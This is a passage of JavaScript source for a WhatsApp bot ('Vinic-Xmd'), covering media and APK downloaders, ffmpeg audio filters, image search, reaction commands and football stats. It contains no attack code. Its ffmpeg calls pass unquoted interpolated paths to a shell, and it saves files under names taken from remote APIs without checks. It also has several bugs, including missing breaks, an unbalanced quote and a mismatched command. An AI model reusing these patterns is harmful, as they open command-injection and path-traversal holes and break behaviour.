          mimeType = 'video/webm';
          break;
        case 'application/vnd.android.package-archive':
          mimeType = 'application/vnd.android.package-archive';
          break;
        default:
          mimeType = 'application/octet-stream';
      }

      conn.sendMessage(m.chat, { document: buffer, mimetype: mimeType, fileName: filename }, { quoted: m });
    } catch (error) {
      reply(`Error downloading file: ${error.message}`);
    }
}
break
case "apk": {
if (!text) return reply("*Which apk do you want to download?*");
    
    try {
      let apiUrl = await fetchJson(`https://api.bk9.dev/search/apk?q=${text}`);
      let kelvin = await fetchJson(`https://api.bk9.dev/download/apk?id=${apiUrl.BK9[0].id}`);

      await conn.sendMessage(
        m.chat,
        {
          document: { url: kelvin.BK9.dllink },
          fileName: kelvin.BK9.name,
          mimetype: "application/vnd.android.package-archive",
          contextInfo: {
            externalAdReply: {
              title: botname,
              body: `${kelvin.BK9.name}`,
              thumbnailUrl: `${kelvin.BK9.icon}`,
              sourceUrl: `${kelvin.BK9.dllink}`,
              mediaType: 2,
              showAdAttribution: true,
              renderLargerThumbnail: false
            }
          }
        },
        { quoted: m }
      );
    } catch (error) {
      reply(global.mess.error);
    }
}
break
case "gdrive": {
if (!text) return reply("*Please provide a Google Drive file URL*");

    try {
      let response = await fetch(`${global.siputzx}/api/d/gdrive?url=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.status || !data.data) {
        return reply("*Please try again later or try another command!*");
      } else {
        const downloadUrl = data.data.download;
        const filePath = path.join(__dirname, `${data.data.name}`);

        const writer = fs.createWriteStream(filePath);
        const fileResponse = await axios({
          url: downloadUrl,
          method: 'GET',
          responseType: 'stream'
        });

        fileResponse.data.pipe(writer);

        writer.on('finish', async () => {
          await conn.sendMessage(m.chat, {
            document: { url: filePath },
            fileName: data.data.name,
            mimetype: fileResponse.headers['content-type']
          });

          fs.unlinkSync(filePath);
        });

        writer.on('error', (err) => {
          console.error('Error downloading the file:', err);
          reply("An error occurred while downloading the file.");
        });
      }
    } catch (error) {
      console.error('Error fetching Google Drive file details:', error);
      reply(global.mess.error);
    }
}
break
case "image":
case "img":
case "pinterest": {
if (!text) return reply("*Please provide a search query*");

    try {
      let response = await fetch(`https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.result || data.result.length === 0) {
        return reply("*No images found or API error. Please try again later or try another query!*");
      } else {
        const images = data.result.slice(0, 5);

        for (const imageUrl of images) {
          await conn.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: `Search: ${text}`,
          });
          await new Promise(resolve => setTimeout(resolve, 500)); 
        }
      }
    } catch (error) {
      console.error('Error fetching images:', error);
      reply(global.mess.error);
    }
}
break
case "instagram": {
if (!text) return reply('*Please provide an Instagram URL!*');

    const apiUrl = `${global.api}/igdl?url=${encodeURIComponent(text)}`;
    
    try {
      const response = await fetch(apiUrl);
      const data = await response.json();
      if (!data || data.url.length === 0) return reply('*Failed to retrieve the video!*');

      const videoUrl = data.url;
      const title = `Instagram Video`;

      await conn.sendMessage(m.chat, {
        video: { url: videoUrl },
        mimetype: 'video/mp4',
        fileName: `${title}.mp4`
      }, { quoted: m });
    } catch (error) {
      console.error('Download command failed:', error);
      reply(global.mess.error);
    }
}
break
case 'gitclone': {
if (!text) return reply("*Please provide gitHub repository link*")
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return reply("*Invalid link*")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await reply(`*Error! Repository Not Found*`)
}}
break
case 'mediafire': {
if (!text) return reply("*Please provide a MediaFire file URL*");

    try {
      let response = await fetch(`${global.siputzx}/api/d/mediafire?url=${encodeURIComponent(text)}`);
      let data = await response.json();

      if (response.status !== 200 || !data.status || !data.data) {
        return reply("*Please try again later or try another command!*");
      } else {
        const downloadUrl = data.data.downloadLink;
        const filePath = path.join(__dirname, `${data.data.fileName}.zip`);

        const writer = fs.createWriteStream(filePath);
        const fileResponse = await axios({
          url: downloadUrl,
          method: 'GET',
          responseType: 'stream'
        });

        fileResponse.data.pipe(writer);

        writer.on('finish', async () => {
          
          await conn.sendMessage(m.chat, {
            document: { url: filePath },
            fileName: data.data.fileName,
            mimetype: 'application/zip'
          });

          fs.unlinkSync(filePath);
        });

        writer.on('error', (err) => {
          console.error('Error downloading the file:', err);
          reply("An error occurred while downloading the file.");
        });
      }
    } catch (error) {
      console.error('Error fetching MediaFire file details:', error);
      reply(global.mess.error);
    }
}
break
case "itunes": {
if (!text) return reply("*Please provide a song name*");
    
    try {
      let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`);
      if (!res.ok) {
        throw new Error(`*API request failed with status ${res.status}*`);
      }
      let json = await res.json();
      let songInfo = `*Song Information:*\n
 • *Name:* ${json.name}\n
 • *Artist:* ${json.artist}\n
 • *Album:* ${json.album}\n
 • *Release Date:* ${json.release_date}\n
 • *Price:* ${json.price}\n
 • *Length:* ${json.length}\n
 • *Genre:* ${json.genre}\n
 • *URL:* ${json.url}`;
     
      if (json.thumbnail) {
        await conn.sendMessage(
          m.chat,
          { image: { url: json.thumbnail }, caption: songInfo },
          { quoted: m }
        );
      } else {
        reply(songInfo);
      }
    } catch (error) {
      console.error(error);
      reply(global.mess.error);
    }
}
break;
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
reply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await conn.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
conn.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
conn.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
  break       
case "facebook": {
if (!text) return reply(`*Please provide a Facebook video url!*`);
    
    try {
      var dlink = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/fbdl?url=${text}`);
      var dlurl = dlink.data.high;
      
      await conn.sendMessage(m.chat, {
        video: {
          url: dlurl,
          caption: global.botname
        }
      }, {
        quoted: m
      });
    } catch (error) {
      reply(global.mess.error);
    }
}
break
case 'tiktok':
case 'tt': {
    if (!text) return reply(bot, `Use: ${prefix + command} <tiktok_link>`, m)
    
    await reply(bot, 'Please wait Vinic-Xmd 💪 its fetching you video...', m)
    
    try {
        let data = await fg.tiktok(text)
        let json = data.result
        let caption = `[ TIKTOK DOWNLOAD ]\n\n`
        caption += `◦ *ID*: ${json.id}\n`
        caption += `◦ *Username*: ${json.author?.nickname || 'N/A'}\n`
        caption += `◦ *Title*: ${json.title || 'No title'}\n`
        caption += `◦ *Likes*: ${json.digg_count || 0}\n`
        caption += `◦ *Comments*: ${json.comment_count || 0}\n`
        caption += `◦ *Shares*: ${json.share_count || 0}\n`
        caption += `◦ *Plays*: ${json.play_count || 0}\n`
        caption += `◦ *Created*: ${json.create_time || 'Unknown'}\n`
        caption += `◦ *Size*: ${json.size || 'Unknown'}\n`
        caption += `◦ *Duration*: ${json.duration || 'Unknown'} seconds`
        
        if (json.images) {
            // Handle image slideshow
            for (let imageUrl of json.images) {
                await conn.sendMessage(m.chat, { 
                    image: { url: imageUrl },
                    caption: caption
                }, { quoted: m })
                await sleep(2000) // Delay between images
            }
        } else if (json.play) {
            // Handle video
            await conn.sendMessage(m.chat, { 
                video: { url: json.play }, 
                mimetype: 'video/mp4',
                caption: caption
            }, { quoted: m })
            
            // Send music separately if available
            if (json.music) {
                await sleep(3000)
                await conn.sendMessage(m.chat, { 
                    audio: { url: json.music },
                    mimetype: 'audio/mpeg'
                }, { quoted: m })
            }
        } else {
            await reply(bot, 'Failed to download TikTok content. The link might be invalid or private.', m)
        }
    } catch (error) {
        console.error('TikTok Error:', error)
        await reply(bot, 'Error downloading TikTok content. Please try again later or check the link.', m)
    }
}
break
case "tiktok2": {
if (!args[0]) return reply('*Please provide a TikTok video url!*');
    
    try {
      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
      
      await conn.sendMessage(
        m.chat,
        {
          caption: global.wm,
          video: { url: apiUrl.data.video },
          fileName: "video.mp4",
          mimetype: "video/mp4",
        },
        { quoted: m }
      );
    } catch (error) {
      reply(global.mess.error);
    }
}
break
case "TikTok audio": {
if (!args[0]) return reply('*Please provide a TikTok audio url!*');
    
    try {
      let apiUrl = await fetchJson(`https://api-aswin-sparky.koyeb.app/api/downloader/tiktok?url=${args[0]}`);
      
      await conn.sendMessage(
        m.chat,
        {
          audio: { url: apiUrl.data.audio },
          fileName: "tiktok.mp3",
          mimetype: "audio/mpeg",
        },
        { quoted: m }
      );
    } catch (error) {
      reply(global.mess.error);
    }
}
break
case "savestatis":
case  "save": {
await saveStatusMessage(m);
  }
break
case " apk": {
try {
    if (!q) {
      return reply("❌ Please provide an app name to search.");
    }

    await conn.sendMessage(from, { react: { text: "⏳", key: m.key } });

    const apiUrl = `http://ws75.aptoide.com/api/7/apps/search/query=${q}/limit=1`;
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (!data || !data.datalist || !data.datalist.list.length) {
      return reply("⚠️ No results found for the given app name.");
    }

    const app = data.datalist.list[0];
    const appSize = (app.size / 1048576).toFixed(2); // Convert bytes to MB

    const caption = `╭━━━〔 *APK Downloader* 〕━━━┈⊷
┃ 📦 *Name:* ${app.name}
┃ 🏋 *Size:* ${appSize} MB
┃ 📦 *Package:* ${app.package}
┃ 📅 *Updated On:* ${app.updated}
┃ 👨‍💻 *Developer:* ${app.developer.name}
╰━━━━━━━━━━━━━━━┈⊷
🔗 *Powered By Vinic-Xmd *`;

    await conn.sendMessage(from, { react: { text: "⬆️", key: m.key } });

    await conn.sendMessage(from, {
      document: { url: app.file.path_alt },
      fileName: `${app.name}.apk`,
      mimetype: "application/vnd.android.package-archive",
      caption: caption
    }, { quoted: m });

    await conn.sendMessage(from, { react: { text: "✅", key: m.key } });

  } catch (error) {
    console.error("Error:", error);
    reply("❌ An error occurred while fetching the APK. Please try again.");
  }
 }
 
//====[AUDIO MENU]==========
break
case 'bass': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=54:width_type=o:width=2:g=20 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case "blown": {
  try {
  const quoted = m.quoted ? m. 
  quoted : null;
  const mime = quoted?.
  mimetype || "";
  if (!quoted || !/audio/.test(mime)) {
    return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af atempo=4/4,asetrate=44500*2/3 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case 'earrape': {
try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af volume=12 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case "volaudio": {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to adjust volume.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -filter:a volume= ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
case 'treble': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath} -af equalizer=f=10000:width_type=o:width=2:g=15 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
break
case 'fast': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.5" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'slow': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different filter for treble
    exec(`ffmpeg -i ${mediaPath}  -filter:a "atempo=0.8 ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  
}
case 'reverse': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter_complex "areverse" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'echo': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "aecho=0.8:0.9:1000:0.3" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'robot': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'deep': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*0.7,aresample=44100" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'chipmunk': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "asetrate=44100*1.5,aresample=44100" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'nightcore': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to modify it.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    exec(`ffmpeg -i ${mediaPath} -filter:a "atempo=1.06,asetrate=44100*1.25" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}
case 'instrumental': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to extract instrumental.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Using the karaoke filter to remove vocals (center channel removal)
    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=c1,aresample=async=1:first_pts=0" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'vocalremove': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to remove vocals.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // More advanced vocal removal technique
    exec(`ffmpeg -i ${mediaPath} -af "pan=stereo|c0=c0|c1=-1*c1" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

case 'karaoke': {
  try {
    const quoted = m.quoted ? m.quoted : null;
    const mime = quoted?.mimetype || "";

    if (!quoted || !/audio/.test(mime)) {
      return reply(`Reply to an *audio file* with *${prefix + command}* to create karaoke version.`);
    }

    const mediaPath = await conn.downloadAndSaveMediaMessage(quoted);
    const outputPath = getRandom('.mp3');

    // Different approach to vocal removal
    exec(`ffmpeg -i ${mediaPath} -af "stereotools=mode=ms>lr" ${outputPath}`, (error) => {
      fs.unlinkSync(mediaPath);
      if (error) return reply(error.toString());

      const audioBuffer = fs.readFileSync(outputPath);
      conn.sendMessage(m.chat, { audio: audioBuffer, mimetype: 'audio/mpeg' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
  } catch (err) {
    reply(err.toString());
  }
  break;
}

//====end of audio menu =====

//=====[IMAGE MENU]======[
case "wallpaper": {
if (!text) return reply("📌 *Enter a search query.*");

      try {
        const results = await wallpaper(text);
        if (!results.length) return reply("❌ *No wallpapers found.*");

        const randomWallpaper = results[Math.floor(Math.random() * results.length)];
        await conn.sendMessage(
          m.chat,
          {
            caption: `📌 *Title:* ${randomWallpaper.title}\n📁 *Category:* ${randomWallpaper.type}\n🔗 *Source:* ${randomWallpaper.source}\n🖼️ *Media URL:* ${randomWallpaper.image[2] || randomWallpaper.image[1] || randomWallpaper.image[0]}`,
            image: { url: randomWallpaper.image[0] }
          },
          { quoted: m }
        );
      } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching the wallpaper.*");
      }
}
break
case " Wikipedia": {
if (!text) return reply("📌 *Enter a search query.*");

      try {
        const results = await wikimedia(text);
        if (!results.length) return reply("❌ *No Wikimedia results found.*");

        const randomWiki = results[Math.floor(Math.random() * results.length)];
        await conn.sendMessage(
          m.chat,
          {
            caption: `📌 *Title:* ${randomWiki.title}\n🔗 *Source:* ${randomWiki.source}\n🖼️ *Media URL:* ${randomWiki.image}`,
            image: { url: randomWiki.image }
          },
          { quoted: m }
        );
      } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching Wikimedia results.*");
      }
}
break
case " remini": {
const quoted = m.quoted ? m.quoted : null || m.msg ;
      const mime = quoted?.mimetype || "";

      if (!quoted) return reply("📌 *Send or reply to an image.*");
      if (!/image/.test(mime)) return reply(`📌 *Send or reply to an image with caption:* ${prefix + command}`);

      try {
        const media = await m.quoted.download();
        if (!media) return reply("❌ *Failed to download media. Try again.*");

        const enhancedImage = await remini(media, 'enhance');
        await conn.sendMessage(m.chat, { image: enhancedImage, caption: "*Image enhanced successfully*" }, { quoted: m });
      } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while enhancing the image.*");
      }
}
break
//====[REACTION CMDS]=======
case 'kiss':
case 'cium':
case 'beso':
await fetchReactionImage({ conn, m, reply, command: 'kiss' });
break;
case "cry": {
await fetchImageReaction({ conn, m, reply, command: 'cry' });
}
break
case "blush": {
await fetchReactionImage({ conn, m, reply, command: 'blush'});
}
break
case 'dance': {
await fetchReactionImage ({ conn, m, reply, command: 'dance'})
}
break
case "kill": {
await fetchReactionImage ({ conn, m, reply, command: 'kill'})
}
break
case "hug": {
await fetchReactionImage ({ conn, m, reply, command: 'kill'})
}
break
case "kick": {
await fetchReactionImage ({ conn, m, reply, command: 'kick'})
}
break
case "slap": {
await fetchReactionImage ({ conn, m, reply, command: 'slap'})
}
break
case "happy": {
await fetchReactionImage ({ conn, m, reply, command: 'happy'})
}
break
case 'bully': {
await fetchReactionImage ({ conn, m, reply, command: 'bully'})
}
//=====[Sport menu]======
case 'epl': // English Premier League
case '.pl': {
  if (!text) return reply(`Please specify what you want:\n.epl standings\n.epl matches\n.epl scorers\n.epl upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('PL', 'Premier League', { m, reply: (msg) => conn.reply(msg) });
  } else if (query === 'matches' || query === 'results') {
    await formatMatches('PL', 'Premier League', { m, reply: (msg) => connreply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('PL', 'Premier League', { m, reply: (msg) => conn.reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('PL', 'Premier League', { m, reply: (msg) => conn.reply(msg) });
  } else {
    m.reply(`Invalid option. Use:\n.epl standings\n.epl matches\n.epl scorers\n.epl upcoming`);
  }
  break;
}

case 'laliga': // La Liga
case '.ll': {
  if (!text) return reply(`Please specify what you want:\n.laliga standings\n.laliga matches\n.laliga scorers\n.laliga upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('LL', 'La Liga', { m, reply: (msg) => reply(msg) });
  } else if (query === 'matches' || query === 'results') {
    await formatMatches('LL', 'La Liga', { m, reply: (msg) => reply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('LL', 'La Liga', { m, reply: (msg) => reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('LL', 'La Liga', { m, reply: (msg) => m.reply(msg) });
  } else {
    reply(`Invalid option. Use:\n.laliga standings\n.laliga matches\n.laliga scorers\n.laliga upcoming`);
  }
  break;
}

case 'bundesliga': // Bundesliga
case '.bl': {
  if (!text) return reply(`Please specify what you want:\n.bundesliga standings\n.bundesliga matches\n.bundesliga scorers\n.bundesliga upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
  } else if (query === 'matches' || query === 'results') {
    await formatMatches('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('BL', 'Bundesliga', { m, reply: (msg) => reply(msg) });
  } else {
    reply(`Invalid option. Use:\n.bundesliga standings\n.bundesliga matches\n.bundesliga scorers\n.bundesliga upcoming`);
  }
  break;
}

case 'seriea': // Serie A
case '.sa': {
  if (!text) return reply(`Please specify what you want:\n.seriea standings\n.seriea matches\n.seriea scorers\n.seriea upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('SA', 'Serie A', { m, reply: (msg) => m.reply(msg) });
  } else if (query === 'matches' || query === 'results') {
    await formatMatches('SA', 'Serie A', { m, reply: (msg) => m.reply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('SA', 'Serie A', { m, reply: (msg) => m.reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('SA', 'Serie A', { m, reply: (msg) => reply(msg) });
  } else {
    reply(`Invalid option. Use:\n.seriea standings\n.seriea matches\n.seriea scorers\n.seriea upcoming`);
  }
  break;
}

case 'ligue1': // Ligue 1
case '.l1': {
  if (!text) return reply(`Please specify what you want:\n.ligue1 standings\n.ligue1 matches\n.ligue1 scorers\n.ligue1 upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('L1', 'Ligue 1', { m, reply: (msg) => reply(msg) });
  } else if (query === 'matches' || query === 'results') {
